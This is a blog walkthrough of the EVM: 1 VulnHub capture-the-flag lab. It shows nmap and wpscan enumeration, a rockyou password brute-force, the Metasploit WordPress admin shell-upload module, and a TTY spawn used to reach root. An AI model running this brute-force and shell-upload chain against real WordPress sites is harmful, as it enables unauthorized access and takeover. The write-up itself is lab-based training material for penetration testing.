<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">EVM: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/evm-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-11-18T15:22:07+00:00">November 18, 2019</time><time class="updated" datetime="2025-06-10T20:10:56+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will solve EVM lab. This lab is designed by Ic0de and it is an easy lab as the author has intended it, beginners. You can download the lab from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/evm-1,391/">here</a></strong></span>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodologies:</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
<li><span style="color: #000000;">Enumeration Using WPScan</span></li>
<li><span style="color: #000000;">Password Bruteforce using WPScan</span></li>
<li><span style="color: #000000;">Getting Login Credentials</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Exploiting using Metasploit</span></li>
<li><span style="color: #000000;">Getting a reverse connection</span></li>
<li><span style="color: #000000;">Spawning a TTY Shell</span></li>
<li><span style="color: #000000;">Enumeration for Root Credentials</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Getting Login Credentials</span></li>
<li><span style="color: #000000;">Logging in as root</span></li>
<li><span style="color: #000000;">Reading the Final Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">First, we will find the IP address of our target machine and for that please use the following command as it helps to see all the IPâ€™s in an internal network:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kutwphiULyY/XdQHpt-XwjI/AAAAAAAAhXM/Vld4K8iU5sM0vZqF4obXHPAafIpXd3iogCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As you can see from the above image, our target IP is <strong>192.168.1.103. </strong>Now that we know target IP, we can move on to scanning our target so that step by step we can attack further and gain control of the machine and scanning will help us to find an opening. We will scan with the help of nmap and for that use the following command:</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ASB6X-ZbvmE/XdQHrEVDgWI/AAAAAAAAhXY/2P6FEICIrNU5xu680aiDdGSp1zgVbrpkgCLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;">With the help of nmap, we observed that port number <strong>22, 53, 80, 110, 139, 143, 445</strong> are open with the services of <strong>SSH, DNS, HTTP, POP3, NETBIOS, IMAP and NETBIOS</strong> respectively.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">As port 80 is open, let us try and open the IP in the browser as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lc-Lv7y5hCM/XdQHrRJhwMI/AAAAAAAAhXc/ElrUW_-i1DsVbtGlMsDJ4cqEowaglQwaACLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">The apache webpage opens which is normal except for the fact that there was a comment saying â€œ<strong>you can find me at /wordpress/ im vulnerable </strong><strong>ðŸ˜Š</strong> â€œ</span></p>
<p><span style="color: #000000;">Now according to this comment, it means there is a vulnerable directory called â€˜WordPressâ€™. So to confirm we used dirb command which is:</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.103/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TOrT3h0ysjk/XdQHrqwqf9I/AAAAAAAAhXg/gScdzhnej-Ax1Ias7WgHFxQLPMpgKFogACLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">And to no surprise, there is a directory called â€˜WordPressâ€™. Now, this is wordpress, as the name suggests, we can use wpscan to find more about it. And for this, type:</span></p>
<pre class="lang:default decode:true">wpscan --url http://192.168.1.103/wordpress/ -e at -e ap -e u</pre>
<p><span style="color: #000000;">With this command, we are telling the wpscan to enumerate(-e) all themes(at), all plugins(ap) installed on the wordpress site. And finally, all the users(u) that might be logged in on the WordPress Site.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6CyKrlRVsUI/XdQHrxlHxtI/AAAAAAAAhXk/durBNymJ0wc6MOcM9wzLG7yevMu5phQxQCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">As you can see in the image below, there is a vulnerable plugin <strong>c0rrupt3d_brain</strong> where we can attack via bruteforce and get a password to log in.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l4tnuvspI0k/XdQHsSbWjHI/AAAAAAAAhXo/QJGlg7hi4UsOrswECMo-__hewzGr3sZ8gCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">So, for our bruteforce, we will use rockyou wordlist and to put it in action type:</span></p>
<pre class="lang:default decode:true">wpscan --url http://192.168.1.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1_OJ0t1-hAA/XdQHskivj6I/AAAAAAAAhXs/Unnd-FgI3lE2LW4GVmCblvqS5rLs-4XaQCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">And when the bruteforce is successful, it will give you the password i.e. <strong>24992499;</strong> which is shown in the image below too:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TIUO4K49VjQ/XdQHs-lSWcI/AAAAAAAAhXw/d3hGAfM9wx0sAMfbztVXIOrBJ_yRClE2QCLcBGAsYHQ/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">Now that we know username and password, we can use an inbuilt wordpress exploit from Metasploit. Firstly, start Metasploit by typing â€˜msfconsoleâ€™ and the type the following command:</span></p>
<pre class="lang:default decode:true ">use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 192.168.1.103
set targeturi /wordpress
set username c0rrupt3d_brain
set password 24992499
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4pNF5YPUR9s/XdQHp5ECu3I/AAAAAAAAhXQ/flzOFRrpTgsq6oMvaTXqr0IITsmEU-mJQCLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">So, once the exploit is running and attack is successful, you can have your meterpreter session. When you have the meterpreter session, go home by typing <strong>cd /home</strong> and checklist of things home has to offer by using <strong>ls</strong> command. There was only on folder there named <strong>root3r</strong> and when you navigate yourself to that folder and check the list of files with the same command you used before. Here, you will find <strong>.root_password_ssh.txt file</strong>; upon reading this text file with a cat you will find the password of the root user just its shown in the image below:</span></p>
<pre class="lang:default decode:true">cd /home
ls
cd root3r
ls
cat .root_password_ssh.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K_ZI5suKMEM/XdQHpmOkBQI/AAAAAAAAhXI/L7hcfJSK_GoYjlWHNo-OieA0Pbddi-3YwCLcBGAsYHQ/s1600/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now, we know that the password of the root user is <strong>willy26. </strong>We can now switch our user to root and for this type:</span></p>
<pre class="lang:default decode:true">shell
python -c 'import pty;pty.spawn("/bin/bash")'
su root
willy26</pre>
<p><span style="color: #000000;">Now you are logged in as root along with its privileges too. As you can see in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pEgnvTMVHpE/XdQHqy3HRsI/AAAAAAAAhXU/kaqcNDFCSTQ1H40B-2wZON_sE96b58pzACLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Once you are logged in as a root user, navigate yourself around and go to the root folder by typing cd /root. And there when you will use ls command, you find a proof.txt document. Upon reading it with cat command, it will show you that you have successfully pwned the machine. YAY!!!!!!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Pavandeep Singh is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on Twitter and <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">LinkedIn</a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
